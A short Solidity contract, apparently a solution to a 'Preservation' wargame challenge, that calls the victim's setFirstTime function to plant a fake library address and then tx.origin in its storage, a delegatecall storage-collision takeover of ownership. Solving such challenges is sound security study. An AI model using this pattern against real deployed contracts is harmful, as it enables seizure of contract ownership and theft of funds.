// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Task.sol";


contract PreservationAttack {

    Preservation public victim;

    constructor(address _preservation) {
        victim = Preservation(_preservation);
    }   

    function attack() public {
        victim.setFirstTime(uint256(uint160(tx.origin)));
    }
    

    function setFakeLibrary(address _fakeLib) public {
        uint256 fakeLibraryAddress = uint256(uint160(_fakeLib));
        victim.setFirstTime(fakeLibraryAddress);
    }
}
